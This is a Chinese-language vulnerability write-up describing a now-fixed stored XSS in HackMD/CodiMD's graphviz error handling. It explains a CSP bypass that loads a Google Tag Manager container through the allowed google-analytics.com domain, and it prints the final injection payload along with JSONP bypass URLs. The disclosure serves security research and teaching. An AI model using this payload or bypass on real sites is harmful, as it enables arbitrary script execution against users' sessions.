HackMD Stored XSS & Bypass CSP with Google Tag Manager
===

前一陣子 Orange 發表了一篇 [A Wormable XSS on HackMD!
](https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html)

剛好在那之前有跟著研究了一下這個漏洞，學習到了很多有關於 CSP 繞過的奇技淫巧

當然這次利用到的 `Google Tag Manager` 我覺得也是一個蠻有趣的繞過方式，在後面也會藉此順便聊聊整個測試的思路以及最後怎麼利用 Google Tag Manager 繞過 CSP 並最終觸發 Stored XSS 

比較有趣的是，上次在 Review `CodiMD` 的 Repo 之後，我本來以為已經沒有相較之下比較高風險的弱點了，但沒想到藉由夥伴意外的發現，重新仔細 Review 原始碼之後，竟然還發現有幾個已經存在兩年多的程式碼都沒有妥善的 escape，也就因此導致本次的 Stored XSS，這也告訴我們漏洞總會藏在我們意想不到的地方，並不是我們單方面認為沒漏洞就沒有的 XDDD


## 漏洞成因

最初會注意到這個漏洞，是因為朋友 HexRabbit 約在 3 月底發現同學利用 `graphviz` 語法撰寫 flowchart 時，在語法錯誤的情況下會額外跳出一個含有錯誤訊息的小方塊，並意外發現錯誤訊息中的 tag 並沒有被 filter，而且可以插入任意的 html，錯誤訊息如下方範例: 

![](https://i.imgur.com/5RjrFH3.png)

我們仔細追一下[原始碼](https://github.com/hackmdio/codimd/blob/1434cdb6b2e89cc771913ea1bd2c44779206196c/public/js/extra.js#L360)，會發現處理 graphviz 的部分為以下程式碼：
```=javascript=1
  // graphviz
  var graphvizs = view.find('div.graphviz.raw').removeClass('raw')
  graphvizs.each(function (key, value) {
    try {
      var $value = $(value)
      var $ele = $(value).parent().parent()

      var graphviz = Viz($value.text())
      if (!graphviz) throw Error('viz.js output empty graph')
      $value.html(graphviz)

      $ele.addClass('graphviz')
      $value.children().unwrap().unwrap()
    } catch (err) {
      $value.unwrap()
      $value.parent().append('<div class="alert alert-warning">' + err + '</div>')
      console.warn(err)
    }
})
```

我們可以發現在 `$value.parent().append('<div class="alert alert-warning">' + err + '</div>')` 的地方，當發生錯誤時會直接 append `err` 訊息到 html 之中，完全沒有做任何的 escape，換句話說，我們只要想辦法在 error message 塞入惡意的 HTML 程式碼，就可以去任意執行 JavaScript

另外一個部分就是，在測試的過程中，我發現這個 Stored XSS 還是有所限制的，最大長度只能輸入到 82 個字，再多就會被吃掉，也就是我們還要想辦法在 82 個字以內完成任意 JavaScript 的執行（其實一開始想到這邊我就有點卡住了，因為繞 CSP 構造的 Gadgets 或 jsonp 照經驗來說都會超過這個長度...）

## CSP Bypass

雖然我們得到了一個 Stored XSS，但是沒有預期的彈窗，我們從 Console 以及過往的經驗可以得知 HackMD 是有配置 CSP(Content Security Policy) 來阻擋未經授權的 JavaScript 執行的！而現階段的 CSP 代碼如下：

```
script-src 'self' vimeo.com https://gist.github.com www.slideshare.net 'unsafe-eval' 
https://assets.hackmd.io https://www.google.com https://apis.google.com https://docs.google.com 
https://www.dropbox.com https://*.disqus.com https://*.disquscdn.com https://www.google-analytics.com 
https://stats.g.doubleclick.net https://secure.quantserve.com https://rules.quantcount.com https://pixel.quantserve.com 
https://js.driftt.com https://embed.small.chat https://static.small.chat https://www.googletagmanager.com 
https://cdn.ravenjs.com https://browser.sentry-cdn.com 'nonce-6fea8a60-c394-470c-86bd-73259adc065d' 
'sha256-EtvSSxRwce5cLeFBZbvZvDrTiRoyoXbWWwvEVciM5Ag=' 'sha256-NZb7w9GYJNUrMEidK01d3/DEtYztrtnXC/dQw7agdY4=' 
'sha256-L0TsyAQLAc0koby5DCbFAwFfRs9ZxesA+4xg0QDSrdI='; img-src * data:; style-src 'self' 'unsafe-inline' 
https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com 
https://fonts.gstatic.com https://*.disquscdn.com https://static.small.chat; font-src 'self' data: 
https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com; object-src *; media-src *; 
frame-src *; child-src *; connect-src *; base-uri 'none'; form-action 'self' https://www.paypal.com; upgrade-insecure-requests
```

雖然 `unsafe-eval` 還在，但最難過的是 `https://cdnjs.cloudflare.com` 已經從 CSP 被拿掉了，所以我們不能使用這個方便的 domain 來 exploit，那還有什麼招可以使用呢？我們還是先把這條 CSP Rule 擺上 Google 提供的 [CSP Evaluator](https://csp-evaluator.withgoogle.com/) 來檢核

![](https://i.imgur.com/65mrIIH.png)

我們可以發現網站很快地列出了一些高風險的 domain 提供測試，但我們要如何快速的知道這些 domain 該如何利用呢？

我們可以直接到 Google 在 GitHub 上的專案 `csp-evaluator` 上面尋找，於是我們透過[此專案](https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/json/jsonp.json)在 `whitelist_bypasses/json/jsonp.json` 目錄下的檔案，很快的知道其中三個 domain 的 jsonp 該如何使用：

* Viemo 
    * 長度過長，而且無法有效地控制內容
    * https://vimeo.com/api/oembed.json?format=json&callback=alert&url=https://vimeo.com/286898202

* www.google.com
    * 沒找到有效控制內容的方式
    * https://www.google.com/tools/feedback/escalation-options?callback=alert

* disqus
    * 無法有效控制內容
    * https://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d


以上這三個 domain 在測試過後都無法有效利用（也可能是我沒有找到正確的方法，還請各位多多指教），而另外兩個為 Google Tag Manager 的服務，分別是 `www.googletagmanager.com` 以及 `www.google-analytics.com`，之前查詢資料的過程中，曾經看到 kobo 的這篇部落格[Content Security Policy Level 3におけるXSS対策](https://inside.pixiv.blog/kobo/5137)

![csp](https://inside.pixiv.blog/wp-content/uploads/2018/10/csp-bypass-chart.png)

CSP rule 如果在 `script-src` 同時有 `www.google-analytics.com` 以及 `unsafe-eval` 的話，就可以執行任意的 JavaScript，到這裡還不是很確定是否可以 Exploit，於是我們馬上動手試試，首先開啟 Google Tag Manager，設定一個變數，並放入你想要執行的 JavaScript

![](https://i.imgur.com/K863Bl0.png)

接著開啟代碼設定，將這個變數放入任一位置（只要讓變數載入就好），並設定觸發事件

![](https://i.imgur.com/MtfzBku.png)

產生完畢後會得到屬於你的 GA link：
* https://www.google-analytics.com/gtm/js?id=GTM-P49RD4V

最後只要放入原本就有支援 GA 的 HackMD，我們就會發現 JavaScript 程式碼被執行

至此，我們就成功繞過 CSP 以及能夠執行任意長度的代碼了！以下是最終代碼：

```
```graphviz
graph<<script src="https://www.google-analytics.com/gtm/js?id=GTM-P49RD4V">

```

Demo 影片如下： https://www.youtube.com/watch?v=m8Q9hX9jBFM

## 後記

當看到 `unsafe-eval` 的時候，其實第一篇想到的是 [Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)，但最尷尬的是這次的 XSS 限制 82 bytes，串起一個 Gadgets 很容易就超過了，所以一開始就沒有往這個方向挖掘 XD

另外這個漏洞已經修復了，可以參考此 [Pull Request](https://github.com/hackmdio/codimd/pull/1193)

最後感謝 [@HexRabbit](https://github.com/HexRabbit/) 發現這個 XSS 的注入點，讓我們能發現好玩的方法 Bypass CSP！
